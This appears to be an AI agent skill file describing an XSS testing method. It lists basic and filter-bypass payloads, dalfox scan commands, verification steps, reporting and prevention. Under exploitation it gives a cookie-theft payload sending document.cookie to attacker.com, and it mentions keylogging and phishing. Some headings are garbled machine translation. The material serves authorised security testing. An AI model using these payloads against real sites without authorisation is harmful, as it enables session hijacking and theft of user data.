---
name: xss-testing
description: Professional skills and methodology for cross-site scripting (XSS) testing
version: 1.0.0
---

# XSS Testing Skills

## Overview

This skill covers the tests for reflective, storage and DOM XSS.

## XSS Types

### 1. Reflected XSS
- The malicious script is passed through URL parameters
- The server returns the response containing the script directly
- The user has to click the malicious link

### 2. Stored XSS
- Malicious script stored on server (database, file, etc.)
- All users accessing affected pages execute scripts
- The impact is greater.

### 3. DOM-based XSS
- Client-side JavaScript mishandles user input
- No server-side processing is involved
- Triggered by modifying the DOM structure

## Test Method

### BasicPayload
```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

### Overfiltration

#### Case around
```javascript
<ScRiPt>alert('XSS')</ScRiPt>
```

#### Encoding Bypass
```javascript
%3Cscript%3Ealert('XSS')%3C/script%3E
&#60;script&#62;alert('XSS')&#60;/script&#62;
```

#### Event handlers
```javascript
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
<div onmouseover=alert('XSS')>hover</div>
<input onfocus=alert('XSS') autofocus>
```

#### Pseudo-agreement.
```javascript
<a href="javascript:alert('XSS')">click</a>
<iframe src="javascript:alert('XSS')">
```

### Advanced bypass technology

#### UsingString. fromCharCode
```javascript
<script>alert(String.fromCharCode(88,83,83))</script>
```

#### Use eval and atob
```javascript
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
```

#### Use HTML entities
```javascript
&#60;script&#62;alert('XSS')&#60;/script&#62;
```

## Using the Tools

### dalfox
```bash
# Basic scan
dalfox url "http://target.com/page?q=test"

# Specify parameters
dalfox url "http://target.com/page" -d "q=test" -X POST

# Use custompayload
dalfox url "http://target.com/page?q=test" --custom-payload payloads.txt
```

### Burp Suite
- Bulk testing using Intruder module
- Manually test with Repeater
- Automatically detect using Scanner

### Browser Console
- Test DOM XSS
- Check the JavaScript execution environment
- Debugpayload

## Validation and utilization

### Verification Steps
1. Confirm that payload is executed
2. Check if filtered or encoded
3. Test different contexts (HTML, JavaScript, properties, etc.)
4. Assess the impact (Cookie theft, session hijacking, etc.)

### Take advantage of the scene.
- Cookie theft: `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`
- Keyboard Record: Inject Keyboard Incident Monitor
- Fishing attacks: forgery of login forms
- Session hijacking: get user session token

## Reporting Checklist

- XSS type (reflection/storage/DOM)
- Trigger Position and Parameters
- FullPOC
- Impact assessment
- Remediation recommendations (output code, CSP strategy, etc.)
- The entry of the platform will be detected through the `report_finding` tool (the only entry to the platform 's recorded vulnerabilities) after confirmation

## Preventive Measures

- Enter authentication and filtering
- Output code (HTML, JavaScript, URL)
- Content Security Policy (CSP)
- HttpOnly CookieMark
- Use of secure frameworks and libraries
